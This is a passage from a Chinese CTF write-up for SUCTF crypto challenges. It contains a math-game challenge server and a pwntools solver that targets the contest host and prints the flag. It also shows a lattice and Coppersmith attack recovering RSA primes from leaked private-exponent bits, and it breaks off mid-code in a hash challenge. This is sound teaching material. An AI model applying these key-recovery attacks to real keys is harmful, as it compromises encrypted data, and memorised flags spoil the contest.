class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socketserver<br><span class="hljs-keyword">import</span> signal<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> sage.geometry.hyperbolic_space.hyperbolic_isometry <span class="hljs-keyword">import</span> moebius_transform<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br>banner = <span class="hljs-string">br&#x27;&#x27;&#x27;</span><br><span class="hljs-string"> _____ ______   ________  _________  ___  ___          ________  ________  _____ ______   _______      </span><br><span class="hljs-string">|\   _ \  _   \|\   __  \|\___   ___\\  \|\  \        |\   ____\|\   __  \|\   _ \  _   \|\  ___ \     </span><br><span class="hljs-string">\ \  \\\__\ \  \ \  \|\  \|___ \  \_\ \  \\\  \       \ \  \___|\ \  \|\  \ \  \\\__\ \  \ \   __/|    </span><br><span class="hljs-string"> \ \  \\|__| \  \ \   __  \   \ \  \ \ \   __  \       \ \  \  __\ \   __  \ \  \\|__| \  \ \  \_|/__  </span><br><span class="hljs-string">  \ \  \    \ \  \ \  \ \  \   \ \  \ \ \  \ \  \       \ \  \|\  \ \  \ \  \ \  \    \ \  \ \  \_|\ \ </span><br><span class="hljs-string">   \ \__\    \ \__\ \__\ \__\   \ \__\ \ \__\ \__\       \ \_______\ \__\ \__\ \__\    \ \__\ \_______\</span><br><span class="hljs-string">    \|__|     \|__|\|__|\|__|    \|__|  \|__|\|__|        \|_______|\|__|\|__|\|__|     \|__|\|_______|</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>welcome = <span class="hljs-string">b&quot;\nWelcome to my math game, let&#x27;s start now!\n&quot;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>(socketserver.BaseRequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_recvall</span>(<span class="hljs-params">self</span>):<br>        BUFF_SIZE = <span class="hljs-number">2048</span><br>        data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            part = <span class="hljs-variable language_">self</span>.request.recv(BUFF_SIZE)<br>            data += part<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(part) &lt; BUFF_SIZE:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">return</span> data.strip()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, msg, newline=<span class="hljs-literal">True</span></span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> newline:<br>                msg += <span class="hljs-string">b&#x27;\n&#x27;</span><br>            <span class="hljs-variable language_">self</span>.request.sendall(msg)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">recv</span>(<span class="hljs-params">self, prompt=<span class="hljs-string">b&#x27;SERVER &lt;INPUT&gt;: &#x27;</span></span>):<br>        <span class="hljs-variable language_">self</span>.send(prompt, newline=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>._recvall()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">game1</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;\nLet&#x27;s play the game1!&quot;</span>)<br>        rounds = <span class="hljs-number">1000</span><br>        pseudo_prime = <span class="hljs-built_in">int</span>(<span class="hljs-variable language_">self</span>.recv(prompt=<span class="hljs-string">b&#x27;[+] Plz Tell Me your number: &#x27;</span>))<br>        <span class="hljs-keyword">if</span> isPrime(pseudo_prime):<br>            <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;\nNo! it&#x27;s a prime, go away!&quot;</span>)<br>            <span class="hljs-variable language_">self</span>.request.close()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(rounds):<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">pow</span>(randint(<span class="hljs-number">2</span>, pseudo_prime), pseudo_prime - <span class="hljs-number">1</span>, pseudo_prime) != <span class="hljs-number">1</span>:<br>                <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;\nYou failed in round &quot;</span> + <span class="hljs-built_in">str</span>(i + <span class="hljs-number">1</span>).encode() + <span class="hljs-string">b&#x27;, bye~~&#x27;</span>)<br>                <span class="hljs-variable language_">self</span>.request.close()<br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;\nCongratulations, you have won the game1!\n&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">game2</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;Let&#x27;s play the game2!&quot;</span>)<br>        res = <span class="hljs-variable language_">self</span>.recv(prompt=<span class="hljs-string">b&#x27;[+] Plz give Me your a, b, c: &#x27;</span>)<br>        a,b,c = [<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> res.split(<span class="hljs-string">b&#x27;,&#x27;</span>)]<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">assert</span> (<span class="hljs-built_in">isinstance</span>(a, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(a, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(c, <span class="hljs-built_in">int</span>))<br>            <span class="hljs-keyword">assert</span> a &gt; <span class="hljs-number">0</span><br>            <span class="hljs-keyword">assert</span> b &gt; <span class="hljs-number">0</span><br>            <span class="hljs-keyword">assert</span> c &gt; <span class="hljs-number">0</span><br>            <span class="hljs-keyword">assert</span> a / (b + c) + b / (a + c) + c / (a + b) == <span class="hljs-number">4</span><br>            <span class="hljs-keyword">assert</span> <span class="hljs-built_in">int</span>(a).bit_length() &gt; <span class="hljs-number">900</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(a).bit_length() &lt; <span class="hljs-number">1000</span><br>            <span class="hljs-keyword">assert</span> <span class="hljs-built_in">int</span>(b).bit_length() &gt; <span class="hljs-number">900</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(b).bit_length() &lt; <span class="hljs-number">1000</span><br>            <span class="hljs-keyword">assert</span> <span class="hljs-built_in">int</span>(c).bit_length() &gt; <span class="hljs-number">900</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(c).bit_length() &lt; <span class="hljs-number">1000</span><br>            <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;\nCongratulations, you have won the game2!\n&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;\nNo! Game over!&quot;</span>)<br>            <span class="hljs-variable language_">self</span>.request.close()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">final_game</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;Let&#x27;s play the game3!&quot;</span>)<br>        set_random_seed(<span class="hljs-built_in">int</span>(time.time()))<br>        C = ComplexField(<span class="hljs-number">999</span>)<br>        M = random_matrix(CC, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>)<br>        Trans = <span class="hljs-keyword">lambda</span> z: moebius_transform(M, z)<br>        out = []<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>            x = C.random_element()<br>            out.append((x,Trans(x)))<br>        out = <span class="hljs-built_in">str</span>(out).encode()<br>        <span class="hljs-variable language_">self</span>.send(out)<br>        kx = C.random_element()<br>        kx_str = <span class="hljs-built_in">str</span>(kx).encode()<br>        <span class="hljs-variable language_">self</span>.send(kx_str)<br>        C2 = ComplexField(<span class="hljs-number">50</span>)<br>        ans = C(<span class="hljs-variable language_">self</span>.recv(prompt=<span class="hljs-string">b&#x27;[+] Plz Tell Me your answer: &#x27;</span>).decode())<br>        <span class="hljs-keyword">if</span> C2(ans) == C2(Trans(kx)):<br>            <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;\nCongratulations, you have won the game3!&quot;</span>)<br>            <span class="hljs-variable language_">self</span>.send(flag)<br>            <span class="hljs-variable language_">self</span>.request.close()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;\nNo! Game over!&quot;</span>)<br>            <span class="hljs-variable language_">self</span>.request.close()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self</span>):<br>        signal.alarm(<span class="hljs-number">300</span>)<br>        <span class="hljs-variable language_">self</span>.send(banner)<br>        <span class="hljs-variable language_">self</span>.send(welcome)<br>        step1 = <span class="hljs-variable language_">self</span>.game1()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> step1:<br>            <span class="hljs-variable language_">self</span>.request.close()<br>        step2 = <span class="hljs-variable language_">self</span>.game2()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> step2:<br>            <span class="hljs-variable language_">self</span>.request.close()<br>        <span class="hljs-variable language_">self</span>.final_game()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadedServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ForkedServer</span>(socketserver.ForkingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    HOST, PORT = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">10001</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;HOST:POST &quot;</span> + HOST+<span class="hljs-string">&quot;:&quot;</span> + <span class="hljs-built_in">str</span>(PORT))<br>    server = ForkedServer((HOST, PORT), Task)<br>    server.allow_reuse_address = <span class="hljs-literal">True</span><br>    server.serve_forever()<br></code></pre></td></tr></table></figure><h3 id="解题-2"><a class="markdownIt-Anchor" href="#解题-2"></a> 解题</h3><p>题目被分为了三个挑战</p><h4 id="game1"><a class="markdownIt-Anchor" href="#game1"></a> GAME1</h4><p>伪素数，随便找了个wp拿了一个数</p><blockquote><p><a href="https://ctftime.org/writeup/21898">https://ctftime.org/writeup/21898</a><br />340649031679478708871356501710247209854526956821188127472136012686397651</p></blockquote><h4 id="game2"><a class="markdownIt-Anchor" href="#game2"></a> GAME2</h4><p>通过搜索知道是一种’钓鱼题’，并且已经有了很详细分析</p><p>论文地址:<code>https://ami.uni-eszterhazy.hu/uploads/papers/finalpdf/AMI_43_from29to41.pdf</code></p><p>首先看了这个视频讲解，有了大致的概念<code>https://www.bilibili.com/video/BV1TA411175n</code></p><p>然后找了个脚本<code>https://ctftime.org/writeup/9637</code>，在根据论文和这篇<code>https://zhuanlan.zhihu.com/p/33853851</code>的讲解，调整参数m可以逐渐增长数字直到获得我们想要的数据</p><h4 id="game3"><a class="markdownIt-Anchor" href="#game3"></a> GAME3</h4><p>通过搜索知道是一种Möbius变换，不懂，但搜到脚本一把梭<code>https://github.com/Masrt200/sagetf/blob/master/Advanced%20Crypto.ipynb</code>(搜索引擎搜索Möbius即可)，然后由于精度问题，有点难通过验证（不知道是不是因为这个），所以直接爆破了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    r=remote(<span class="hljs-string">&quot;1.95.46.185&quot;</span>,<span class="hljs-number">10001</span>)<br><br>    <span class="hljs-comment">#https://ctftime.org/writeup/21898 随便拿一个数</span><br>    r.recvuntil(<span class="hljs-string">b&#x27;[+] Plz Tell Me your number: &#x27;</span>)<br>    r.sendline(<span class="hljs-string">b&#x27;340649031679478708871356501710247209854526956821188127472136012686397651&#x27;</span>)<br><br>    <span class="hljs-comment">#https://zhuanlan.zhihu.com/p/33853851</span><br>    N=<span class="hljs-number">4</span><br>    e=(<span class="hljs-number">4</span>*(N^<span class="hljs-number">2</span>)) + ((<span class="hljs-number">12</span>*N)-<span class="hljs-number">3</span>)<br>    f=<span class="hljs-number">32</span>*(N+<span class="hljs-number">3</span>)<br>    eq=EllipticCurve([<span class="hljs-number">0</span>,e,<span class="hljs-number">0</span>,f,<span class="hljs-number">0</span>]) <span class="hljs-comment"># Define the elliptic curve corresponding to the equation a/(b+c)+b/(a+c)+c/(a+b)=N</span><br>    eq.rank()<br>    eq.gens()<br>    tmpP=eq(-<span class="hljs-number">100</span>,<span class="hljs-number">260</span>)<br>    m=<span class="hljs-number">9</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        P=m*tmpP<br>        x=P[<span class="hljs-number">0</span>]<br>        y=P[<span class="hljs-number">1</span>]<br>        a=(<span class="hljs-number">8</span>*(N+<span class="hljs-number">3</span>)-x+y)/(<span class="hljs-number">2</span>*(N+<span class="hljs-number">3</span>)*(<span class="hljs-number">4</span>-x))<br>        b=(<span class="hljs-number">8</span>*(N+<span class="hljs-number">3</span>)-x-y)/(<span class="hljs-number">2</span>*(N+<span class="hljs-number">3</span>)*(<span class="hljs-number">4</span>-x))<br>        c=(-<span class="hljs-number">4</span>*(N+<span class="hljs-number">3</span>)-(N+<span class="hljs-number">2</span>)*x)/((N+<span class="hljs-number">3</span>)*(<span class="hljs-number">4</span>-x))<br>        da=denominator(a)<br>        db=denominator(b)<br>        dc=denominator(c)<br>        l=lcm(da,lcm(db,dc))<br>        a,b,c=[<span class="hljs-built_in">int</span>(a*l),<span class="hljs-built_in">int</span>(b*l),<span class="hljs-built_in">int</span>(c*l)]<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">assert</span> a &gt; <span class="hljs-number">0</span><br>            <span class="hljs-keyword">assert</span> b &gt; <span class="hljs-number">0</span><br>            <span class="hljs-keyword">assert</span> c &gt; <span class="hljs-number">0</span><br>            <span class="hljs-keyword">assert</span> a / (b + c) + b / (a + c) + c / (a + b) == <span class="hljs-number">4</span><br>            <span class="hljs-keyword">assert</span> <span class="hljs-built_in">int</span>(a).bit_length() &gt; <span class="hljs-number">900</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(a).bit_length() &lt; <span class="hljs-number">1000</span><br>            <span class="hljs-keyword">assert</span> <span class="hljs-built_in">int</span>(b).bit_length() &gt; <span class="hljs-number">900</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(b).bit_length() &lt; <span class="hljs-number">1000</span><br>            <span class="hljs-keyword">assert</span> <span class="hljs-built_in">int</span>(c).bit_length() &gt; <span class="hljs-number">900</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(c).bit_length() &lt; <span class="hljs-number">1000</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br>        m=m+<span class="hljs-number">1</span><br><br>    r.recvuntil(<span class="hljs-string">b&#x27;[+] Plz give Me your a, b, c: &#x27;</span>)<br>    r.sendline((<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;a&#125;</span>,<span class="hljs-subst">&#123;b&#125;</span>,<span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>).encode())<br><br>    <span class="hljs-comment">#https://github.com/Masrt200/sagetf/blob/master/Advanced%20Crypto.ipynb</span><br>    r.recvuntil(<span class="hljs-string">b&quot;Let&#x27;s play the game3!&quot;</span>)<br>    r.recvline()<br>    C = ComplexField(<span class="hljs-number">999</span>)<br>    zw=r.recvline().strip().decode()<br>    zw=<span class="hljs-built_in">eval</span>(zw)<br>    z4=r.recvline().strip().decode()<br>    Z, W = [], []<br>    <span class="hljs-keyword">for</span> z,w <span class="hljs-keyword">in</span> zw:<br>        Z.append(C(z))<br>        W.append(C(w))<br>    z = C(z4)<br>    A = (W[<span class="hljs-number">0</span>] - W[<span class="hljs-number">1</span>]) * (z - Z[<span class="hljs-number">1</span>]) * (Z[<span class="hljs-number">0</span>] - Z[<span class="hljs-number">2</span>])<br>    B = (W[<span class="hljs-number">0</span>] - W[<span class="hljs-number">2</span>]) * (Z[<span class="hljs-number">0</span>] - Z[<span class="hljs-number">1</span>]) * (z - Z[<span class="hljs-number">2</span>])<br>    fz = (A * W[<span class="hljs-number">2</span>] - B * W[<span class="hljs-number">1</span>])/(A - B)<br>    r.sendline(<span class="hljs-built_in">str</span>(fz).encode())<br>    flag=r.recvall()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;suctf&#x27;</span> <span class="hljs-keyword">in</span> flag <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27;SUCTF&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>        <span class="hljs-built_in">print</span>(flag)<br>        r.close()<br>        <span class="hljs-keyword">break</span><br>    r.close()<br><br><span class="hljs-comment">#b&#x27;[+] Plz Tell Me your answer: \nCongratulations, you have won the game3!\n\nSUCTF&#123;Hope_Y0u_have_a_NICE_tr1p_in_SUCTF~&#125;\n&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="复现"><a class="markdownIt-Anchor" href="#复现"></a> 复现</h2><blockquote><p>以下复现参考鸡块师傅的wp:<a href="https://tangcuxiaojikuai.xyz/post/67c5a822.html">https://tangcuxiaojikuai.xyz/post/67c5a822.html</a></p></blockquote><h3 id="su_rsa"><a class="markdownIt-Anchor" href="#su_rsa"></a> *SU_rsa</h3><h4 id="题目-3"><a class="markdownIt-Anchor" href="#题目-3"></a> 题目</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>).read()<br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>e = getPrime(<span class="hljs-number">256</span>)<br>n = p*q<br>d = inverse(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>d_m = ((d &gt;&gt; <span class="hljs-number">512</span>) &lt;&lt; <span class="hljs-number">512</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;d_m = &quot;</span>,d_m)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n = &quot;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e = &quot;</span>,e)<br><br><span class="hljs-keyword">assert</span> flag[<span class="hljs-number">6</span>:-<span class="hljs-number">1</span>] == sha256(<span class="hljs-built_in">str</span>(p).encode()).hexdigest()[:<span class="hljs-number">32</span>]<br></code></pre></td></tr></table></figure><h4 id="解题-3"><a class="markdownIt-Anchor" href="#解题-3"></a> 解题</h4><p>d高位，之前密挑有一个d高位+低位的，看来还没研究透。</p><p>我自己只能到求出k了，后面就不知道怎么格，太难了。（哭</p><p>主要点就是格的配平，然后格出来的结果第二行才是目标向量，而且也不是预期的</p><p>然后得到p%e的值，p低位求解，要用到多线程爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>d_m =  <span class="hljs-number">54846367460362174332079522877510670032871200032162046677317492493462931044216323394426650814743565762481796045534803612751698364585822047676578654787832771646295054609274740117061370718708622855577527177104905114099420613343527343145928755498638387667064228376160623881856439218281811203793522182599504560128</span><br>n =  <span class="hljs-number">102371500687797342407596664857291734254917985018214775746292433509077140372871717687125679767929573899320192533126974567980143105445007878861163511159294802350697707435107548927953839625147773016776671583898492755338444338394630801056367836711191009369960379855825277626760709076218114602209903833128735441623</span><br>e =  <span class="hljs-number">112238903025225752449505695131644979150784442753977451850362059850426421356123</span><br><br><br>k = e*d_m // n + <span class="hljs-number">1</span><br><span class="hljs-comment"># s=p+q</span><br><span class="hljs-comment"># ed_l+ks+[ed_h-1-k(n+1)]=0</span><br><span class="hljs-comment">#(d_l,s,1)*L=(d_l,s,1)</span><br><br>L = Matrix(ZZ, [<br>    [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>,  e],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, k],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, e*d_m - <span class="hljs-number">1</span> - k*(n+<span class="hljs-number">1</span>)],<br>])<br><br><span class="hljs-comment"># 配平目标向量</span><br><span class="hljs-comment"># 513就行了(512也不行)，至于为啥，我不清楚</span><br>L[:, -<span class="hljs-number">1</span>:] *= <span class="hljs-number">2</span>^<span class="hljs-number">513</span><br><br>L = L.LLL()<br><span class="hljs-comment"># L[0]:(-k,e,0)</span><br><span class="hljs-comment"># L[1]:(d_l-t*k,s+t*e,0)</span><br><span class="hljs-comment"># 理解：e和k只有256bit，比我们想要的d_l(512bit)和s(512bit)都要短</span><br><span class="hljs-comment"># LLL之后肯定是前者这个较短的向量,所以从第二小的向量入手</span><br><br>res=L[<span class="hljs-number">1</span>] <span class="hljs-comment"># s+t*e</span><br>s=res[<span class="hljs-number">1</span>]%e<br>PR.&lt;x&gt; = PolynomialRing(Zmod(e))<br>f = x^<span class="hljs-number">2</span> + n - s*x   <span class="hljs-comment">#p*p+p*q-p*s</span><br>res = f.roots()<br>pl = <span class="hljs-built_in">int</span>(res[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]) <span class="hljs-comment"># p%e</span><br><br><span class="hljs-keyword">import</span> multiprocessing<br><span class="hljs-keyword">import</span> tqdm<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">copper_attack</span>(<span class="hljs-params">i</span>):<br>    PR.&lt;x&gt; = PolynomialRing(Zmod(n))<br>    f = e*(<span class="hljs-number">2</span>^<span class="hljs-number">12</span>*x + i) + pl<br>    f = f.monic()<br>    res = f.small_roots(X=<span class="hljs-number">2</span>^<span class="hljs-number">244</span>, beta=<span class="hljs-number">0.499</span>, epsilon=<span class="hljs-number">0.02</span>)<br>    <span class="hljs-keyword">if</span>(res != []):<br>        t = <span class="hljs-built_in">int</span>(res[<span class="hljs-number">0</span>])<br>        p = e*(<span class="hljs-number">2</span>^<span class="hljs-number">12</span>*t + i) + pl<br>        q = n // p<br>        <span class="hljs-keyword">assert</span> p * q == n <span class="hljs-keyword">and</span> isPrime(p) <span class="hljs-keyword">and</span> isPrime(q)<br>        <span class="hljs-built_in">print</span>(sha256(<span class="hljs-built_in">str</span>(p).encode()).hexdigest()[:<span class="hljs-number">32</span>])<br>        <span class="hljs-built_in">print</span>(sha256(<span class="hljs-built_in">str</span>(q).encode()).hexdigest()[:<span class="hljs-number">32</span>])<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">with</span> multiprocessing.Pool(processes=<span class="hljs-number">16</span>) <span class="hljs-keyword">as</span> pool:<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> tqdm.tqdm(pool.imap(copper_attack, <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>^<span class="hljs-number">12</span>)), total=<span class="hljs-built_in">int</span>(<span class="hljs-number">2</span>^<span class="hljs-number">12</span>)):<br>        <span class="hljs-keyword">if</span>(_):<br>            <span class="hljs-keyword">break</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1c56d344aba19600db3956abebc34425</span><br><span class="hljs-string">c1864501fab1841178177d4f15af4ad8</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h3 id="su_hash"><a class="markdownIt-Anchor" href="#su_hash"></a> *SU_hash</h3><h4 id="题目-4"><a class="markdownIt-Anchor" href="#题目-4"></a> 题目</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 